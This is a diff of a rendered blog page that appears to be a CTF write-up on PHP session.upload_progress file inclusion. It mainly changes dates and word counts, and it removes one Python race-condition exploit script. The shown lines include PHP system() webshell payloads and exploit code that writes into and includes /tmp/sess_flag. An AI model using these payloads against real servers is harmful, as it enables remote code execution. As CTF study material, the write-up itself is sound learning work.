@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-03-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    1.6k
                 </div>
                 
 
@@ -475,34 +475,6 @@ post：&lt;?php system("tac flag.php");?&gt;<span aria-hidden="true" class="line
 </blockquote>
 <p>简而言之，我们可以利用<code>session.upload_progress</code>将木马写入session文件，然后包含这个session文件。不过前提是我们需要创建一个session文件，并且知道session文件的存放位置。因为<code>session.use_strict_mode=off</code>的关系，我们可以自定义sessionID<br>linux系统中session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</p>
 <p>例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建文件：/tmp/sess_flag，即使此时用户没有初始化session，php也会自动初始化Session。 并产生一个键值，为<code>prefix+name</code>的值，最后被写入sess_文件里<br>还有一个关键点就是<code>session.upload_progress.cleanup</code>默认是开启的，只要读取了post数据，就会清除进度信息，所以我们需要利用条件竞争来pass，写一个脚本来完成</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> threading
-url <span class="token operator">=</span> <span class="token string">'http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/'</span>
-
-<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    data <span class="token operator">=</span> <span class="token punctuation">{</span>
-        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php system("tac f*");?&gt;dotast'</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>
-        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'dota.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?file=/tmp/sess_flag'</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> <span class="token string">'dotast'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-            <span class="token keyword">break</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'retry'</span><span class="token punctuation">)</span>
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    write <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    write<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
-    write<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    read<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io
 <span class="token keyword">import</span> requests
 <span class="token keyword">import</span> threading
@@ -1098,7 +1070,7 @@ if(test.status_code == 200):
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">15.8k</span>
+                        class="white-color">16.8k</span>
             
             
             
